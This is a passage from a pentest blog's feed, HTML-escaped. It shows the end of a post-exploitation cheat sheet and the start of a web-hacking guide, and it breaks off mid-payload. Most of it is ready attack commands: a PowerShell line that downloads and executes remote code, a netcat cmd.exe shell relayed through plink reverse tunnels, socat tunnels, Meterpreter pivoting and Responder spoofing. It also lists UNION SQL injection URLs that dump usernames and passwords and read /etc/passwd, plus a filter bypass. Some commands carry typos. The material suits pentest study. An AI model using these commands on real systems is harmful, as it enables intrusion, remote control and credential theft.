find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; 777 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Files with permissions&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/cron.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Check all crontab folders&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Kernel and SO versions&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;transfer-files&quot;&gt;Transfer files&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80 &lt;span class=&quot;c&quot;&gt;#Open server&lt;/span&gt;
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80

&lt;span class=&quot;c&quot;&gt;# Windows&lt;/span&gt;
certutil.exe &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;http://172.20.1.6/file.exe]&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://172.20.1.6/file.exe&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; file.exe
powershell.exe wget &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;http://172.20.1.6/file.exe]&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://172.20.1.6/file.exe&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; file.exe
powershell.exe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://172.20.1.6/file.exe&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;file.exe&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
powershell.exe IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://172.20.1.6/poc.txt&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read and execute &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Windows hex&lt;/span&gt;
/usr/share/windows-resources/binaries/upx &lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt; exec.exe &lt;span class=&quot;c&quot;&gt;# Compress&lt;/span&gt;
exe2hex &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; exec.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; exec.txt &lt;span class=&quot;c&quot;&gt;# To hex&lt;/span&gt;
nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 10.10.10.10 4444 &amp;lt; exec.txt

&lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
wget http://172.20.1.6/file.exe &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tm/file.exe
curl http://172.20.1.6/file.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; file.exe

scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder &lt;span class=&quot;c&quot;&gt;#ssh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;tunneling&quot;&gt;Tunneling&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Windows &lt;/span&gt;
nc.exe &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 5555 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe &lt;span class=&quot;c&quot;&gt;# Attacker&lt;/span&gt;
plink.exe &lt;span class=&quot;nt&quot;&gt;-ssh&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-pw&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 &lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1 1337 &lt;span class=&quot;c&quot;&gt;# Attacker&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22

ssh www-data@172.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; us &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 3333:127.0.0.1:3306
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pivoting&quot;&gt;Pivoting&lt;/h2&gt;
&lt;p&gt;Meterpreter&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ipconfig &lt;span class=&quot;c&quot;&gt;# Networks interface&lt;/span&gt;
route &lt;span class=&quot;c&quot;&gt;# Identify network&lt;/span&gt;

run autoroute &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.0.20.0/24 &lt;span class=&quot;c&quot;&gt;#Add a route to our machine&lt;/span&gt;
use auxiliary/server/sock4a &lt;span class=&quot;c&quot;&gt;# Create a proxy in port 1080&lt;/span&gt;
nano /ect/proxychains.conf &lt;span class=&quot;c&quot;&gt;# Add this proxy to proxychains&lt;/span&gt;
proxychains nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; —open &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110,139 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.20.0/24 &lt;span class=&quot;c&quot;&gt;# The network is visible&lt;/span&gt;
V
portfwd add &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 110 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.20.20.4 &lt;span class=&quot;c&quot;&gt;# Portfoward  a specific port&lt;/span&gt;
nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110 127.0.0.10 &lt;span class=&quot;c&quot;&gt;# Can acess this port&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;internal-pentest&quot;&gt;Internal pentest&lt;/h2&gt;
&lt;h3 id=&quot;responder&quot;&gt;Responder&lt;/h3&gt;
&lt;p&gt;A LLMNR &amp;amp; NBT-NS Spoofing Attack.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim /etc/responder/Responder.conf &lt;span class=&quot;c&quot;&gt;# Configure the ips field RespondTo&lt;/span&gt;

responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-Prv&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Will list to all&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="post-exploitation" /><category term="exploitation" /><summary type="html">This is a guide for post exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Web pentest</title><link href="http://localhost:4000/guide/2022/01/13/web-pentesting.html" rel="alternate" type="text/html" title="Web pentest" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/web-pentesting</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/web-pentesting.html">&lt;h1 id=&quot;web-hacking&quot;&gt;Web hacking&lt;/h1&gt;
&lt;h2 id=&quot;attack-vectors&quot;&gt;Attack vectors&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Parameters&lt;/li&gt;
  &lt;li&gt;Search inputs&lt;/li&gt;
  &lt;li&gt;Login/athentication inputs&lt;/li&gt;
  &lt;li&gt;Fields/register inputs&lt;/li&gt;
  &lt;li&gt;Redirects&lt;/li&gt;
  &lt;li&gt;GET e POST parameters&lt;/li&gt;
  &lt;li&gt;Download&lt;/li&gt;
  &lt;li&gt;Upload&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection.&lt;/h2&gt;
&lt;p&gt;Use sql commands that are not sanitized do retrieve database informations:
Links:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/&quot;&gt;Cheat sheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection/cheat-sheet&quot;&gt;Portswigger&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.w3schools.com/Sql/sql_comments.asp&quot;&gt;w3schools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Sql sintax examples(mysql):&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Show user&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;primary&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auto_increment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;varchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vasrchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;describe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- CONCATENATE selects.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;versions&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Show database version&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/var/www/html/index.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Load a file.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Sleep 5 sec until return.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database that has informations about users,...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database, has informations about created databases, tables, columns.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;sql-information-schema&quot;&gt;SQL Information Schema&lt;/h3&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables&apos;&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 where table_schema =&quot;dbname&quot;%23&apos;&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,column_name,4,5 where table_schema =&quot;dbname&quot; and table_name=&quot;dbusers&quot;%23&apos;&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,nome,login,senha from dbusers %23&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,concat(&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,id,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,login,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,password)4,5 from mrudbuserssers %23&apos;&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,load_file(&quot;/etc/passwd&quot;)%23&apos;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;bypass-addslashes&quot;&gt;Bypass Addslashes&lt;/h3&gt;
&lt;p&gt;Send the string in char.&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;sql-injection-error-based&quot;&gt;SQL Injection Error based&lt;/h3&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,5 